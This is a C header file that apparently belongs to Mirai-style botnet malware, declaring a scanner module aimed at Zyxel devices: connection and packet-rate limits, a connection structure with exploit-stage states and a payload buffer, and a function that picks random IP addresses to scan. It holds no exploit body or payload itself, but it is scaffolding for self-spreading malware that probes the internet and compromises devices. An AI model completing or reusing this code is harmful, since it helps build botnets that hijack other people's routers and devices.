#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define zyxelscanner1_SCANNER_MAX_CONNS 512
#define zyxelscanner1_SCANNER_RAW_PPS 1440
#else
#define zyxelscanner1_SCANNER_MAX_CONNS 256
#define zyxelscanner1_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define zyxelscanner1_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner1_SCANNER_HACK_DRAIN 64
#else
#define zyxelscanner1_SCANNER_RDBUF_SIZE 1024
#define zyxelscanner1_SCANNER_HACK_DRAIN 64
#endif

struct zyxelscanner1_scanner_connection
{
    int fd, last_recv;
    enum
    {
        zyxelscanner1_SC_CLOSED,
        zyxelscanner1_SC_CONNECTING,
        zyxelscanner1_SC_EXPLOIT_STAGE2,
        zyxelscanner1_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[zyxelscanner1_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void zyxelscanner1_scanner_init();
void zyxelscanner1_scanner_kill(void);

static void zyxelscanner1_setup_connection(struct zyxelscanner1_scanner_connection *);
static ipv4_t zyxelscanner1_get_random_ip(void);

